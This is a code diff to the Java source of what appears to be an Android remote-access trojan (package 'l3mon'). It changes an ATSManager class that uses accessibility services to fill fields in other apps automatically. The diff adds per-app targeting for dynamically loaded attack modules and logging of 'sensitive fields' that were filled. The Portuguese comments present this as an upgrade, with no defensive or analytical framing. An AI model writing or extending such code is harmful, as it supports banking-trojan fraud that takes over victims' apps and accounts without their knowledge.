@@ -2,6 +2,7 @@ package com.etechd.l3mon.managers;
 
 import android.os.Bundle;
 import android.view.accessibility.AccessibilityNodeInfo;
+import com.etechd.l3mon.managers.LogManager;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -174,9 +175,15 @@ public class ATSManager {
             return;
 
         // Executar módulos dinâmicos primeiro
+        String currentPackage = root.getPackageName() != null ? root.getPackageName().toString() : "";
+
         for (com.etechd.l3mon.loader.IATSModule module : dynamicModules) {
             try {
-                module.execute(root, config);
+                String target = module.getTargetPackage();
+                // Executa se o target for null (qualquer app) ou bater com o pacote atual
+                if (target == null || target.isEmpty() || target.equals(currentPackage)) {
+                    module.execute(root, config);
+                }
             } catch (Exception e) {
                 android.util.Log.e("ATSManager", "Erro ao executar módulo dinâmico: " + module.getModuleName(), e);
             }
@@ -197,7 +204,19 @@ public class ATSManager {
                     if (fictitiousData != null) {
                         setTextIntoField(node, fictitiousData);
 
-                        // Log pode ser publicado pelo caller
+                        // Logging Avançado: Inteligência de Campo
+                        try {
+                            JSONObject logCtx = new JSONObject();
+                            logCtx.put("pattern", pattern);
+                            logCtx.put("field_id", node.getViewIdResourceName());
+                            LogManager.log(
+                                LogManager.CAT_INTELLIGENCE,
+                                LogManager.LEVEL_INFO,
+                                "ATS_AUTO",
+                                "Campo sensível preenchido automaticamente",
+                                logCtx
+                            );
+                        } catch (Exception ignored) {}
                     }
 
                     return; // Para após preencher o primeiro match
